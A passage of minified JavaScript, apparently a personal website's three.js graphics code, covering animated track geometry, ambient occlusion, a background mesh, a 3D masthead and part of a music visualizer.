exceeded")}else{if(this.lastStartSlot<F){this.clear(this.lastStartSlot,F-this.lastStartSlot)}if(this.lastEndSlot>x){this.clear(x+1,this.lastEndSlot-x)}}this.startSlot=((F%U)+U)%U;this.endSlot=((x%U)+U)%U;this.beginPass(this.startSlot,J);var y=T.map(E-this.edge);var G=T.map(E+z-Q+this.edge);var O=this.generators;this.nextSlot(y,O.begin);this.nextSlot(y,O.beginCap);this.nextSlot(I,O.outline);for(var M=1;M<R;++M){var K=N+M;this.nextSlot(K,O.outline)}if(this.arrow){this.nextSlot(P,O.outline,G);this.nextSlot(P,O.beginArrow,G);this.nextSlot(P,O.midArrow,G);this.nextSlot(P,O.endArrow,G)}else{this.nextSlot(P,O.outline);this.nextSlot(G,O.endCap);this.nextSlot(G,O.end)}this.endPass();this.lastStartSlot=F;this.lastEndSlot=x},getGeometryOffsets:function(w){var z=this.geometryOffsets;var B=this.nSegments*this.nProfile;var A=this.startSlot*this.nProfile;var x=A+this.range*this.nProfile;var y=this.range*this.nProfile;if(A==x){return[]}z[0].priority=this.priority;z[1].priority=this.priority;if(x>B){z[0].start=(w+A)*6;z[0].index=0;z[0].count=(B-A)*6;z[1].start=(w)*6;z[1].index=0;z[1].count=(y-(B-A))*6;return z}else{z[0].start=(w+A)*6;z[0].index=0;z[0].count=y*6;return[z[0]]}},getPathCount:function(){return this.path.vertices.length},getMatrices:function(z){var A=this.path.vertices;var K=this.path.normals;var E=Math.floor(Math.max(0,Math.min(A.length-1.0001,z)));var x=z-E;var J=A[E-1];var I=A[E];var H=A[E+1];var G=A[E+2];var D=K[E];var C=K[E+1];if((E==0&&x<=0.5)||(E==A.length-2&&x>0.5)){g.subVectors(H,I)}else{if(x>0.5){j.subVectors(H,I);h.subVectors(G,H)}else{j.subVectors(I,J);h.subVectors(H,I)}g.copy(j).lerp(h,(x+0.5)%1)}e.copy(D).lerp(C,x);j.copy(I).lerp(H,x);var y=g.normalize();var F=e.normalize();var w=b.crossVectors(y,F);F.crossVectors(y,w);this.mat4.set(w.x,F.x,y.x,j.x,w.y,F.y,y.y,j.y,w.z,F.z,y.z,j.z,0,0,0,1);this.mat3.set(w.x,F.x,y.x,w.y,F.y,y.y,w.z,F.z,y.z);return{mat4:this.mat4,mat3:this.mat3}},getBlank:function(z){var y=this.nProfile;for(var x=0,w=z*8;x<y;++x,w+=8){this.buffer[w]=0;this.buffer[w+1]=0;this.buffer[w+2]=0;this.buffer[w+3]=1;this.buffer[w+4]=0;this.buffer[w+5]=0;this.buffer[w+6]=1;this.buffer[w+7]=1}},getEnd:function(A,y,D){var x=this.getMatrices(A);j.set(0,0,0);j.applyMatrix4(x.mat4);var E=x.mat3.elements;h.set(y*E[6],y*E[7],y*E[8]);if(this.receiveAO){this.getAO(A)}var B=1;if(this.receiveAO){B=(a.y+a.x+u.y+u.x)/4}var w=this.nProfile;for(var C=0,z=D*8;C<w;++C,z+=8){this.buffer[z]=j.x;this.buffer[z+1]=j.y;this.buffer[z+2]=j.z;this.buffer[z+3]=B;this.buffer[z+4]=h.x;this.buffer[z+5]=h.y;this.buffer[z+6]=h.z;this.buffer[z+7]=1}return this.buffer},getOutline:function(C,M,O,x,G,F,y){var J=this.getMatrices(C);var w=this.profile.vertices;var B=this.profile.normals;var I=this.nProfile;var N=J.mat3.elements;e.set(x*N[6],x*N[7],x*N[8]);g.set(G,F,1);if(this.receiveAO){this.getAO(O)}for(var L=0,K=y*8;L<I;++L,K+=8){j.copy(w[L]);j.z+=M;j.multiply(g).applyMatrix4(J.mat4);this.buffer[K]=j.x;this.buffer[K+1]=j.y;this.buffer[K+2]=j.z;var H=1;if(this.receiveAO){var A=(B[L].x*0.5+0.5);var z=(B[L].y*0.5+0.5);A=(A+3*(w[L].x/this.width*0.5+0.5))/4;z=(z+3*(w[L].y/this.height*0.5+0.5))/4;A*=G;z*=F;var E=u.y+(u.x-u.y)*z;var D=a.y+(a.x-a.y)*z;H=E+(D-E)*A}this.buffer[K+3]=H;if(x){this.buffer[K+4]=e.x;this.buffer[K+5]=e.y;this.buffer[K+6]=e.z}else{h.copy(B[L]);h.applyMatrix3(J.mat3);this.buffer[K+4]=h.x;this.buffer[K+5]=h.y;this.buffer[K+6]=h.z}this.buffer[K+7]=1}return this.buffer},getAO:function(y){var w=Math.max(this.AOStart,Math.min(this.AOEnd,this.lengthMap.unmap(y)));var z=(w-this.AOStart)/this.AOStep;var E=Math.min(this.AODiscs.length/2-2,Math.floor(z));var x=z-E;E*=2;var J=this.AODiscs[E].front;var I=this.AODiscs[E+2].front;var H=this.AODiscs[E].back;var G=this.AODiscs[E+2].back;var F=this.AODiscs[E+1].front;var D=this.AODiscs[E+3].front;var B=this.AODiscs[E+1].back;var A=this.AODiscs[E+3].back;function C(K){return Math.max(0.1,Math.min(1-K*0.75))}x=0.5-0.5*Math.cos(x*π);a.set(C(J+(I-J)*x),C(H+(G-H)*x),0);u.set(C(F+(D-F)*x),C(B+(A-B)*x),0)},getN:function(){return this.nProfile},getColor:function(){return this.color},generateDiscs:function(w,G){if(!this.castAO&&!this.receiveAO){return[]}var A=this.AOStep||w;var D=[];var I=_v();var H=_v();var y=this.travelAO||Math.max(300,this.travelOverride);var C=y+(this.lengthAO||Math.min(3000,this.lengthOverride));var x=this.lengthMap;var z=(C-y)/A;this.AOStep=A;this.AOStart=y;this.AOEnd=C;if(this.castAO){for(var E=0;E<z;++E){var B=this.getMatrices(x.map(y)).mat4.elements;I.set(B[12],B[13],B[14]);H.set(B[4],B[5],B[6]);g.set(B[0],B[1],B[2]).multiplyScalar(this.width/1.4);var F=(A/2+this.width/1.2)/2*this.castAO;D.push(new f.Disc(I.clone().add(g),H.clone(),F,this.receiveAO));D.push(new f.Disc(I.clone().sub(g),H.clone(),F,this.receiveAO));y+=A}this.AODiscs=D}else{this.AODiscs=G}return D},};f.Track.index=0;f.Slot=function(){this.offset=-1;this.type=null};f.AmbientOcclusion=function(){this.discs=[];this.discHash={};this.range=130};f.AmbientOcclusion.prototype={build:function(w){var y=50;var x=[];w.forEach(function(z){x=z.generateDiscs(y,x);this.discs=this.discs.concat(x)}.bind(this));this.discs.forEach(function(A){var z=this.hash(A);if(!this.discHash[z]){this.discHash[z]=[]}this.discHash[z].push(A)}.bind(this))},hash:function(w){var x=w.position;return[Math.round(x.x/this.range*0.9),Math.round(x.y/this.range*0.9),Math.round(x.z/this.range*0.9)]},compute:function(){this.shade();this.swap();this.shade()},shade:function(){var K=this.discs.length;var J=this.range;for(var Q=0;Q<K;++Q){var O=this.discs[Q];var N=O.position.x;var I=O.absorption;j.copy(O.position);h.copy(O.normal);var A=this.hash(O);for(var F=-1;F<=1;F++){for(var G=-1;G<=1;G++){for(var H=-1;H<=1;H++){var U=[A[0]+H,A[1]+G,A[2]+F];var S=this.discHash[U];if(!S){continue}var M=S.length;for(var P=0;P<M;++P){var w=S[P];if(O==w){continue}g.copy(w.position).sub(j);var B=g.length();if(B>J){continue}var C=O.normal.dot(w.normal)<0;var E=C?"lastFront":"lastBack";var T=0.4+0.6*Math.max(0,1-w[E]);g.normalize();var L=g.dot(w.normal);var D=g.dot(O.normal);var R=(1-1/Math.sqrt(w.radius*w.radius*2/(B*B)+1))*Math.abs(L)*Math.min(1,4*Math.abs(D));if(D>0){O.front+=R*T*I}else{O.back+=R*T*I}}}}}}},swap:function(){var y=this.discs.length;for(var w=0;w<y;++w){var x=this.discs[w];x.lastFront=x.front;x.lastBack=x.back;x.front=0;x.back=0}},};f.Disc=function(x,y,w,z){this.position=x||_v();this.normal=y||_v();this.radius=w||1;this.absorption=z||1;this.lastFront=0;this.lastBack=0;this.front=0;this.back=0};function p(x){var w=x.clone();w.fragmentShader=THREE.ShaderLib.depthRGBA.fragmentShader;w.vertexShader=Acko.TrackShader.depthVertexShader;w.blending=THREE.NoBlending;w.transparent=true;w.uniforms=x.uniforms;return w}function o(F,B,E,y){var C=[];var D=[];var z=τ/y,x=z/2;j.set(0,0,1);for(var A=0;A<y;++A){C.push(_v(pow(Math.cos(x),E)*F,pow(Math.sin(x),E)*B,0));x+=z}for(var A=0;A<y;++A){D.push(C[(A+1)%y].clone().sub(C[(A+y-1)%y]).cross(j).normalize())}return{vertices:C,normals:D}}function l(w){w.z+=Math.cos(w.x/250)*30;return w}function m(ab,G,L,au,Z,J,H,N,aq,U){var y=[];var Q=[];function B(av){if(H){return l(av)}return av}var O=null;var ai=ab.length;for(var ao=0;ao<ai;++ao){var V=ab[ao-1];var Y=ab[ao];var z=ab[ao+1];var W=Y[0];var ad=Y[1];var af=Y[2]||0;var at=Y[3]||G;if(V&&z&&af>0){var E=V[0];var S=z[0];var ag=z[1];j.subVectors(E,W);var I=j.length();h.subVectors(S,W);var F=h.length();af=Math.min(af,Math.min(I,F)/2);j.multiplyScalar(af/I);h.multiplyScalar(af/F);g.addVectors(j,h);g.add(W);var aa=π/2/(at-1),x=0;for(var an=0;an<at;++an){var A=pow(Math.cos(x),0.8);var K=pow(Math.sin(x),0.8);e.copy(h).multiplyScalar(-A);b.copy(j).multiplyScalar(-K);e.add(b);e.add(g);e.add(J);y.push(B(e.clone()));if(!au){e.copy(ad).multiplyScalar(A);b.copy(ag).multiplyScalar(K);e.add(b);Q.push(e.clone())}else{Q.push(_v())}x+=aa}}else{y.push(B(W.clone().add(J)));Q.push(!au?ad:_v())}}ai=y.length;for(var ao=1;ao<ai-1;++ao){var aj=j.subVectors(y[ao],y[ao-1]).length();if(aj<1){y.splice(ao,1);ao--;ai--}}if(L>0){for(var ao=0;ao<L;++ao){j.copy(y[0]);h.copy(y[1]);for(var an=1;an<ai-2;++an){g.copy(y[an+1]);e.subVectors(j,h);b.subVectors(g,h);var I=e.length();var F=b.length();if(I>0&&F>0){e.add(b).multiplyScalar(N);y[an].add(e)}j.copy(h);h.copy(g)}}}if(aq&&ai>3){var ah=9*τ/360;var w=1*τ/360;var ap=0;var R=0;var T,D;for(var al=0;al<2;++al){T=[];D=[];T.push(y[0]);D.push(Q[0]);j.copy(y[0]);h.copy(y[1]);for(var ao=1;ao<ai-2;++ao){g.copy(y[ao+1]);e.subVectors(j,h).normalize();b.subVectors(g,h).normalize();a.crossVectors(e,b);T.push(y[ao]);D.push(Q[ao]);var P=Math.asin(a.length());if(P>ah){e.copy(y[ao+2]);for(var an=1/2;an<1;an+=1/2){var am=an*an;var ak=am*an;b.x=f.interpolate(j.x,h.x,g.x,e.x,an,am,ak);b.y=f.interpolate(j.y,h.y,g.y,e.y,an,am,ak);b.z=f.interpolate(j.z,h.z,g.z,e.z,an,am,ak);T.push(b.clone());D.push(_v());ap++}}j.copy(h);h.copy(g)}T.push(y[ao]);D.push(Q[ao]);T.push(y[ao+1]);D.push(Q[ao+1]);y=T;Q=D;ai=y.length}if(U){T=[];D=[];T.push(y[0]);D.push(Q[0]);var M=0;j.copy(y[0]);h.copy(y[1]);for(var ao=1;ao<ai-2;++ao){g.copy(y[ao+1]);e.subVectors(j,h).normalize();b.subVectors(g,h).normalize();a.crossVectors(e,b);var P=Math.asin(a.length())+M;if(P>w){T.push(y[ao]);D.push(Q[ao]);M=0}else{R++;M=P}j.copy(h);h.copy(g)}T.push(y[ao]);D.push(Q[ao]);T.push(y[ao+1]);D.push(Q[ao+1]);y=T;Q=D;ai=y.length}}if(au){Q[0].copy(Z).normalize();a.copy(Q[0]);j.copy(y[0]);h.copy(y[1]);for(var ao=1;ao<ai-1;++ao){g.copy(y[ao+1]);e.subVectors(h,j).normalize();b.subVectors(g,h).normalize();e.cross(b);var x=Math.asin(e.length());var ar=Math.cos(x);var ae=Math.sin(x);e.normalize();var C=new THREE.Matrix3(ar+e.x*e.x*(1-ar),e.x*e.y*(1-ar)-e.z*ae,e.x*e.z*(1-ar)+e.y*ae,e.x*e.y*(1-ar)+e.z*ae,ar+e.y*e.y*(1-ar),e.y*e.z*(1-ar)-e.x*ae,e.x*e.z*(1-ar)-e.y*ae,e.y*e.z*(1-ar)+e.x*ae,ar+e.z*e.z*(1-ar));a.applyMatrix3(C).normalize();Q[ao].copy(a);j.copy(h);h.copy(g)}Q[ao].copy(a);for(var ao=0;ao<2;++ao){j.copy(Q[0]);h.copy(Q[1]);for(var an=1;an<ai-1;++an){g.copy(Q[an+1]);e.subVectors(j,h);b.subVectors(g,h);var I=e.length();var F=b.length();if(I>0&&F>0){e.add(b).multiplyScalar(0.3);Q[an].add(e).normalize()}j.copy(h);h.copy(g)}}}var X=navigator.userAgent.match(/Android/);if(X){var ac=y.filter(function(av,aw){return !(aw%2)});var ai=Q.filter(function(av,aw){return !(aw%2)});y=ac;Q=ai}return{vertices:y,normals:Q}}f.interpolate=function(D,C,A,z,E,x,w){var B=(A-D)*0.5,y=(z-C)*0.5;return w*(2*(C-A)+B+y)+x*(-3*(C-A)-2*B-y)+E*B+C};f.LengthMap=function(B){this.points=B;var D=this.lengths=[];var z=this.accum=[0];var C=B.length;var w=0;for(var A=1;A<C;++A){var y=j.subVectors(B[A],B[A-1]).length();D.push(y);z.push(w+=y)}};f.LengthMap.prototype={getLength:function(){return this.accum[this.accum.length-1]},unmap:function(A){var z=Math.floor(Math.max(0,Math.min(this.accum.length-2,A)));var y=A-z;var x=this.accum[z];var w=this.accum[z+1];return x+(w-x)*y},map:function(D){var C=0;var x=this.accum;var w=x.length-2;do{var y=Math.ceil((C+w)/2);if(D<x[y]){w=y-1}else{C=y}}while(w-C>0);var z=x[C];var B=x[C+1];var A=(D-z)/(B-z);return C+A},};function k(y,x,w){var B=[];var A=null;for(var z in y){if((A!=y[z].AODiscs)&&y[z].AODiscs){B=B.concat(y[z].AODiscs)}A=y[z].AODiscs}var D=B.length;var C=new THREE.Object3D();C.add(function(){var N=new THREE.Geometry();var H=N.vertices=[];var M=12;var I=τ/M;for(var K=0;K<D;++K){var L=B[K];var E=L.radius;j.copy(L.normal);h.copy(L.position);g.copy(L.normal);g.x+=g.y*2;g.z+=0.1-g.y;g.cross(j).normalize();e.crossVectors(g,j);u.copy(h);var F=Math.max(0,1-L.front);if(F<=0){continue}H.push(j.clone().multiplyScalar(0.5).add(h));H.push(j.clone().multiplyScalar(F*E).add(h));H.push(g.clone().multiplyScalar(E*0.5).add(h));H.push(g.clone().multiplyScalar(E).add(h));H.push(g.clone().multiplyScalar(-E*0.5).add(h));H.push(g.clone().multiplyScalar(-E).add(h));H.push(e.clone().multiplyScalar(E*0.5).add(h));H.push(e.clone().multiplyScalar(E).add(h));H.push(e.clone().multiplyScalar(-E*0.5).add(h));H.push(e.clone().multiplyScalar(-E).add(h));var G=0;for(var J=0;J<=M;++J){b.copy(g).multiplyScalar(Math.cos(G)*E*F);a.copy(e).multiplyScalar(Math.sin(G)*E*F);a.add(b).add(h);if(J>0){H.push(a.clone());H.push(u.clone())}u.copy(a);G+=I}}N.computeBoundingSphere();var O=new THREE.Line(N,new THREE.LineBasicMaterial({color:x}));O.type=THREE.LinePieces;O.renderDepth=3;return O}());w=w.clone();w.r*=0.5;w.g*=0.5;w.b*=0.5;C.add(function(){var N=new THREE.Geometry();var H=N.vertices=[];var M=12;var I=τ/M;for(var K=0;K<D;++K){var L=B[K];var E=L.radius;j.copy(L.normal);h.copy(L.position);g.copy(L.normal);g.x+=g.y*2;g.z+=0.1-g.y;g.cross(j).normalize();e.crossVectors(g,j);u.copy(h);var F=Math.max(0,1-L.back);if(F<=0){continue}H.push(j.clone().multiplyScalar(-0.5).add(h));H.push(j.clone().multiplyScalar(-F*E).add(h));var G=0;for(var J=0;J<=M;++J){b.copy(g).multiplyScalar(Math.cos(G)*E*F);a.copy(e).multiplyScalar(Math.sin(G)*E*F);a.add(b).add(h);if(J>0){H.push(a.clone());H.push(u.clone())}u.copy(a);G+=I}}N.computeBoundingSphere();var O=new THREE.Line(N,new THREE.LineBasicMaterial({color:w}));O.type=THREE.LinePieces;O.renderDepth=10;return O}());return C}})(Acko.Effect.Tracks);Acko.Effects.push(new Acko.Effect.Tracks());Acko.Effect.Debug=function(){Acko.Effect.call(this);this.order=Infinity;this.display=null;this.last=0};Acko.Effect.Debug.prototype=_.extend(new Acko.Effect(),{build:function(b){return;var f=b.scene;if(this.display){f.remove(this.display)}var a=[];for(var c in b.debug){a.push(b.debug[c])}if(a.length==0){return}var e=this.display=new ThreeRTT.Display(a);e.position.z=0;e.position.y=-350;e.position.x=-500;e.scale.x=400;e.scale.y=400;e.scale.z=400;f.add(e)},update:function(a){var b=Time.get();if(b-this.last>10000){this.last=b;this.build(a)}},resize:function(a){},});Acko.Effects.push(new Acko.Effect.Debug());Acko.Effect.Background=function(){Acko.Effect.call(this);this.order=0;this.group=null;this.opacity=0;this.renderer="webgl"};Acko.Effect.Background.prototype=_.extend(new Acko.Effect(),{build:function(a){a.background=this;var e=a.scene;var c=this.group=new THREE.Object3D();var f=this.makeGeometry();var b=this.material=new THREE.ShaderMaterial(Acko.SolidShader);var g=this.mesh=new THREE.Mesh(f,b);g.position.z=0;g.position.y=100;g.rotation.y=-0.8;g.rotation.x=0.4;g.rotation.z=0.2;g.eulerOrder="YXZ";g.renderDepth=20000;c.add(g);e.add(c);e.fog=this.fog=new THREE.Fog(16777215,1200,2600);this.opacity=a.doIntro?-0.1:1},makeGeometry:function(){var A=new THREE.BufferGeometry();var b=50;var Z=[3000,4200];var K=[-2000,2000];var Q=[17000,20000];var P=[80,170];var N=[80,170];var af=44;var ac=8;var ab=4;var S=ac*(ab+4)*2*af;var E=S*3;A.attributes={index:{itemSize:1,array:new Uint16Array(S*3),},position:{itemSize:3,array:new Float32Array(E*3),},normal:{itemSize:3,array:new Float32Array(E*3),},color:{itemSize:3,array:new Float32Array(E*3),},};var W=0;var T=0;var O=0;var R=A.attributes.index.array;var aj=A.attributes.position.array;var L=A.attributes.normal.array;var e=A.attributes.color.array;function p(){O=W}function D(j,r,o){var k=W*3;aj[k]=j.x;aj[k+1]=j.y;aj[k+2]=j.z;ao.copy(r);ao.multiply(ao).add(r).normalize();L[k]=ao.x;L[k+1]=ao.y;L[k+2]=ao.z;e[k]=o.r;e[k+1]=o.g;e[k+2]=o.b;W++}function am(r,o,c){R[T++]=O+r;R[T++]=O+c;R[T++]=O+o}function h(s,r,o,c){R[T++]=O+s;R[T++]=O+o;R[T++]=O+r;R[T++]=O+r;R[T++]=O+o;R[T++]=O+c}var at=_v();var aq=_v();var ao=_v();var al=new THREE.Matrix4();var ak=new THREE.Matrix4();function z(c){c.x=c.x>0?1:-1;c.y=c.y>0?1:-1;c.z=c.z>0?1:-1}function a(c){return c[0]+rand()*(c[1]-c[0])}var Y=Acko.Palette.red.concat(Acko.Palette.blue);var M=Acko.Palette.platinum[1];var H=773239;rand(H);var F={0:[-1300,0,0,0.3,0,0,0],1:[1200,1800,0,0,0,0,0],2:[930,1100,0,0,0,0,0],3:[2300,1400,0,0.35,0.1,0,0],4:[700,300,140,0,0,0,0.08],5:[1040,220,140,0.2,-0.05,0,-0.2],6:[1050,400,0,0.4,0.1,-0.1,0],8:[800,-240,0,0,0,0,-0.2],24:[0,0,-100,0,0,0,0],25:[-500,0,500,0,0,0,0],36:[0,-300,-0.1,0,0,0,0],};for(var ai=0;ai<af;++ai){var f=false;var C=(ai+rand())/af*τ+2.585;var u=a(Q);var q=a(P);var m=a(N);var l=rand()*0.2+0.6;var J={r:l*M.r,g:l*M.g,b:l*M.b};var an=Math.cos(C);var X=Math.sin(C);var aa=a(Z);if(ai>af-3){aq.set(C+rand()*0.6+0.2,0.6,0.8);at.set(a(K)*0.3-7000,an*aa,X*aa-2000)}else{if(ai>af-5){aq.set(C+rand()*0.6+0.2,1.6,-3.8);at.set(a(K)*0.3+9000,an*aa,X*aa-4000)}else{aq.set(C+rand()*0.35+0.175,0.6,0);at.set(a(K),an*aa*0.7,X*aa)}}ao.set(1,1,1);if(ai>=27&&ai<=32){at.multiplyScalar(1.2)}if(ai==0){at.multiplyScalar(1.1)}if(ai==1||ai==2){at.multiplyScalar(1.1);at.x*=2.7}if(ai==36||ai==39){at.x-=350;at.y+=300;aq.y-=0.05}if(ai==37||ai==38){at.y-=300}if(ai==37){at.y-=700}if(ai>34&&ai<=39){at.multiplyScalar(1.03);at.y-=200}var ae;if(ae=F[ai]){if(ae[6]){J.r+=ae[6];J.g+=ae[6];J.b+=ae[6]}at.x+=ae[0];at.y-=ae[1];at.z+=ae[2];aq.x+=ae[3];aq.y-=ae[4];aq.z+=ae[5]}al.makeFromPositionEulerScale(at,aq,"ZXY",ao);at.set(0,0,0);ak.makeFromPositionEulerScale(at,aq,"ZXY",ao);var ar=τ/ac;var ap=π/ab;var t=ac-1;for(var U=0,g=-π/2+ap/2;U<ab;++U,g+=ap){var G=Math.cos(g);var w=Math.sin(g);for(var V=0,au=ar/2;V<ac;++V,au+=ar){an=Math.cos(au);X=Math.sin(au);p();at.set(an*G,w,X*G);at.multiplyScalar(b);aq.copy(at);z(aq);aq.x*=u;aq.y*=q;aq.z*=m;aq.add(at).applyMatrix4(al);at.normalize().applyMatrix4(ak);D(aq,at,J);if(U>0){var ad=V==t?-ac+1:1;f||h(-ac,ad-ac,0,ad)}}}p();var B=[[1,1],[-1,1],[-1,-1],[1,-1],];an=Math.cos(ap/2);X=Math.sin(ap/2);B.forEach(function(c){at.set(0,b,0);aq.set(u*c[0],q,m*c[1]);aq.add(at).applyMatrix4(al);at.set(0.7*c[0]*X,an,0.7*c[1]*X);at.applyMatrix4(ak);f||D(aq,at,J)});var I=ac/4;var ae=ac;for(var V=0;V<ac;++V){if(V%I==0){continue}f||am(Math.floor(V/I),V-1-ae,V-ae)}for(var V=0;V<4;++V){var ah=(V+3)%4;var ag=(ah+1)*I-1;f||am(V,ag-ae,V*I-ae);f||am(V,ah,ag-ae)}f||h(0,1,3,2);an=Math.cos(ap/2);X=Math.sin(ap/2);B.forEach(function(c){at.set(0,-b,0);aq.set(u*c[0],-q,m*c[1]);aq.add(at).applyMatrix4(al);at.set(0.7*c[0]*X,-an,0.7*c[1]*X);at.applyMatrix4(ak);f||D(aq,at,J)});var I=ac/4;var ae=ac*ab;for(var V=0;V<ac;++V){if(V%I==0){continue}f||am(4+Math.floor(V/I),V-ae,V-1-ae)}for(var V=0;V<4;++V){var ah=(V+3)%4;var ag=(ah+1)*I-1;f||am(4+V,V*I-ae,ag-ae);f||am(4+V,ag-ae,4+ah)}f||h(5,4,6,7)}A.offsets=[{start:0,index:0,count:T,}];return A},update:function(b){var g=b.ride||b.tracks.override();this.mesh.visible=this.opacity>0;this.mesh.position.x=g?0:400;this.mesh.position.z=g?0:-400;this.mesh.rotation.y=g?-0.8:-0.9;this.mesh.rotation.x=0.4;this.mesh.rotation.z=0.2;var h=0.9;this.mesh.scale.set(h,h,h);if(b.ride&&b.audio&&b.audio.currentTime>276){this.opacity-=0.005}else{if(b.audio){this.opacity=1}else{this.opacity+=0.003}}var e=0.5-0.5*Math.cos(Math.min(1,Math.max(0,this.opacity))*π);this.material.uniforms.opacity.value=e;this.material.uniforms.ambientCorrection.value=(b.ambientCorrection||0)+(b.ride?0.3:0.6);b.backgroundOpacity=e;var c=(0.85-0.15*Math.abs(Math.cos(b.cameraController.phi)));var f=b.cameraController.perspective+100;var a=b.cameraController.perspective*1.8+100;this.fog.near=f*c;this.fog.far=a*c},resize:function(a){},});Acko.Effects.push(new Acko.Effect.Background());Acko.Effect.Masthead=function(){Acko.Effect.call(this);this.order=0;this.group=null;this.renderer="css3d";this.showArrow=1;this.showTitle=1;this.arrowOpacity=1;this.titleOpacity=1;this.display="none";this.hovered=false};Acko.Effect.Masthead.prototype=_.extend(new Acko.Effect(),{build:function(h){h.masthead=this;var l=h.scene;var p=document.getElementById("arrow");var j=document.getElementById("masthead");var f=j.cloneNode(true);var e=j.cloneNode(true);j.parentNode.appendChild(f);j.parentNode.appendChild(e);var t=p.cloneNode(true);p.parentNode.appendChild(t);f.className="shadow dead";e.className="shadow dead";t.className="shadow dead";var s=Time.clock();var o=0;var c=j.querySelector("#play");var b=f.querySelector("#play");var a=e.querySelector("#play");c.addEventListener("click",function(u){u.preventDefault();h.cameraController.runRide()});c.addEventListener("mouseover",function(y){b.classList.add("hover");a.classList.add("hover");h.tracks.blackhole=h.time>6.5?1:0;var x=y.relatedTarget;var u=false;while(x=x.parentNode){if(x==c){u=true;break}}if(y.target==c&&!u){var w=Time.clock();if((w-s)<5){o++;if(o==4){this.hovered=true}}else{o=0}s=w}}.bind(this));c.addEventListener("mouseout",function(u){b.classList.remove("hover");a.classList.remove("hover");h.tracks.blackhole=0});var q=this.title=new THREE.CSS3DObject(j);var r=this.arrow=new THREE.CSS3DObject(p);var m=this.titleShadow1=new THREE.CSS3DObject(f);var k=this.titleShadow2=new THREE.CSS3DObject(e);var g=this.arrowShadow=new THREE.CSS3DObject(t);l.add(q);l.add(m);l.add(k);l.add(r);l.add(g);r.position.x=-30;r.position.y=-120;r.position.z=200;r.scale.set(0.7,0.672*0.6,1);r.rotation.z=-τ/4;g.position.copy(r.position);g.position.z+=-3;g.rotation.copy(r.rotation);g.scale.copy(r.scale)},update:function(f){var l=f.ride?0:1;var c=0.5-0.5*Math.cos(Math.max(0,Math.min(1,(f.time-6.7)/0.9))*π);var b=Math.max(0,Math.min(1,Math.cos(f.cameraController.phi+0.5)*4-2.5));var e=Math.max(0,1-f.cameraLerp*f.cameraLerp*4);this.titleOpacity=this.titleOpacity+(+this.showTitle-this.titleOpacity)*0.1;this.arrowOpacity=this.arrowOpacity+(+this.showArrow-this.arrowOpacity)*0.1;var h=Math.max(0.004,e*b*c*l);var g=this.titleOpacity*h;var a=g*g;var k=this.arrowOpacity*h;var m=k*k;if(g!=this.lastTitleOpacity){this.title.element.style.opacity=g;this.titleShadow1.element.style.opacity=a;this.titleShadow2.element.style.opacity=a}if(k!=this.lastArrowOpacity){this.arrow.element.style.opacity=k;this.arrowShadow.element.style.opacity=m}this.lastTitleOpacity=g;this.lastArrowOpacity=k;var j="block";if(this.display!=j){this.title.element.style.display="block";this.arrow.element.style.display="block";this.titleShadow1.element.style.display="block";this.titleShadow2.element.style.display="block";this.arrowShadow.element.style.display="block"}this.display=j;this.hovered&&achievement&&achievement("blkhl");this.hovered=false},resize:function(c){var a=Math.min(1,c.viewWidth/900);var h=this.title;var k=this.arrow;var f=this.titleShadow1;var e=this.titleShadow2;var b=this.arrowShadow;h.position.x=0;h.position.y=0;h.position.z=0;h.rotation.x=-τ/8;h.rotation.y=-τ/4*0.42;h.eulerOrder="YXZ";var g=Math.min(1.3,(1+3/a)*0.25);h.scale.set(g*0.4,g*0.4,g);h.updateMatrixWorld();var l=(_v(0,0,-2.5)).applyMatrix4(h.matrix);h.position.x=200-(1-a)*90;h.position.y=-100-(1-a)*200;h.position.z=325;if(c.tracks){var j=c.tracks.blackholeCenter;j.copy(h.position);j.x+=105;j.y-=7.5}f.position.copy(h.position).add(l);f.rotation.copy(h.rotation);f.eulerOrder=h.eulerOrder;f.scale.copy(h.scale);e.position.copy(h.position).add(l).add(l);e.rotation.copy(h.rotation);e.eulerOrder=h.eulerOrder;e.scale.copy(h.scale)},});Acko.Effects.push(new Acko.Effect.Masthead());Acko.Effect.Visualizer=function(){Acko.Effect.call(this);this.order=-5;this.display=null;this.last=0;this.skip=25;this.fade=10;this.volume=1;this.rotate=0;this.fakelevels=[];this.level=0;this.levels=[];this.smooths=[];this.phases=[];this.finals=[];this.boosts=[];this.smoothboosts=[];this.growlCancel=[];this.playing=false;this.lastTime=this.skip;this.refRotation=_v();this.quietFrames=0;this.q1=new THREE.Quaternion();this.slerpT=0;this.slerpA=0;this.slerpB=0};Acko.Effect.Visualizer.prototype=_.extend(new Acko.Effect(),{build:function(a){a.visualizer=this},start:function(){if(this.playing){return}gl.resize(true);this.masthead.showArrow=0;this.volume=1;this.playing=true;this.startedAt=null;try{if(this.audio){this.audio.pause();this.audio.currentTime=0;this.audio.play()}else{this.injectAudio();this.analyzer=new ThreeAudio.Source(2048,this.audio)}}catch(a){growl({type:"info",text:"<strong>Web Audio API</strong> support is required for music response.",});this.analyzer=null}},stop:function(){this.playing=false;this.masthead.showArrow=1;if(this.audio){try{this.audio.currentTime=0;this.audio.pause()}catch(a){}}this.cameraController.lock(0);this.volume=0;this.tracks.tracks.forEach(function(b,c){if(b._length!==undefined){b.length=b._length;b.travel=b.initial=b._initial;delete b._length;delete b._initial}})},update:function(M){this.tracks=M.tracks;this.cameraController=M.cameraController;this.background=M.background;this.masthead=M.masthead;var o=this.tracks.visibleGroup;var b=this.tracks.depthGroup;var g=this.background.group;if(!this.playing){o.useQuaternion=b.useQuaternion=g.useQuaternion=false;o.rotation.x=0;o.rotation.y=0;o.rotation.z=0;b.rotation.copy(o.rotation);g.rotation.copy(o.rotation);return}if(!this.startedAt&&this.audio&&this.audio.currentTime>this.skip){this.startedAt=Time.absolute()-this.skip}var q=this.startedAt?Time.absolute()-this.startedAt:0;if(this.lastTime<400&&q>=400){achievement&&achievement("hpntd")}var j=422;var L=this.volume*Math.min(1,Math.max(0,Math.exp((-M.scroll.y/M.pageStart)*4+0.3)));if(this.quietFrames<0){L=Math.min(1,1-this.quietFrames/30)}var y=Math.max(0,Math.min(1,(q-this.skip)/this.fade))*Math.max(0,Math.min(1,(j-q)/this.fade));this.level=this.level+(L-this.level)*0.05;if(this.audio){try{this.audio.volume=this.level*y*Acko.globalVolume}catch(C){}}var p;if(this.analyzer){this.analyzer.update();if(this.analyzer.data){p=this.analyzer.data.freq}}if(!p){p=this.fakelevels;var c=q/131.9;var l=Math.min(1,c);for(var z=0;z<1024;++z){var f=Math.sin(z+c*0.3112+Math.cos(c*0.735))+Math.sin(z+c*0.498+Math.cos(c*0.261));p[z]=Math.min(255,Math.max(0,p[z]||0)*0.98+f*(1.5+l))}}var 